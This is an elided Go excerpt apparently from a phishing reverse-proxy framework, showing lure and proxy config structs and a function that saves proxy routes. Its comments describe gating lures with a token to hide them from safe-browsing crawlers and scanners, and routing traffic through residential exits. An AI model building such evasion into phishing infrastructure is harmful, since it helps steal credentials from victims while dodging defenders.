...
type Lure struct {
	...
	// Token gate: when non-empty, the lure only opens for requests carrying
	// ?t=<token>. Everything else (safe-browsing crawlers, scanners, link
...
type ProxyConfig struct {
	...
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	// Routes: domain suffixes routed through the proxy (e.g. "google.com").
	// Empty list = ALL upstream traffic goes through the proxy. Hosts NOT
	// matching any suffix dial direct — lets a residential exit serve only
...
type Config struct {
	...
	cfg             *viper.Viper
	mtx             sync.Mutex
	phishletStamps  map[string]int64
	PhishletsDir    string
}
...
// SetProxyRoutes replaces the proxy routing suffix list and persists it.
// Live re-application is the caller's job (setProxy reads cfg.proxyConfig).
func (c *Config) SetProxyRoutes(routes []string) {
	cleaned := make([]string, 0, len(routes))
	for _, r := range routes {
		r = strings.ToLower(strings.TrimPrefix(strings.TrimSpace(r), "*."))
		if r != "" {
			cleaned = append(cleaned, r)
		}
	}
	c.proxyConfig.Routes = cleaned
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy routes set to: %s", strings.Join(cleaned, ", "))
	c.cfg.WriteConfig()
}
